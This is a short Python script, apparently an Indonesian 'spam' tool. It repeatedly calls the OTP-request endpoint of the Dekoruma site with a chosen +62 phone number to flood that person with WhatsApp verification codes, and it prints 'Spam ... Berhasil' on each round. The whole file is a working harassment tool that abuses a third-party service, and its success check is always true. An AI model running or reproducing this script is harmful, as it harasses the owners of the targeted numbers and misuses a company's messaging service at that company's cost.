#Ananda
import requests,os,sys,json
from time import sleep
from war.war import *

def ruma(nom, jml):
	sleep(1)
	print("")
	data = json.dumps({"phoneNumber":"+62"+nom,"platform":"wa"})

	for x in range(jml):
		cal = requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"content-type": "application/json","user-agent": "Mozilla/5.0 (Linux; Android 6.0; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"},data=data)
		if '' in cal.text:
			print(f"{k}[+] {c}Spam ke {k}+62{nom} {c}Berhasil ")
			sleep(30)
		else:
			print(f"{r}[+] {c}Spam ke {k}+62{nom} {c}Gagal!! ")
			sleep(1.5)

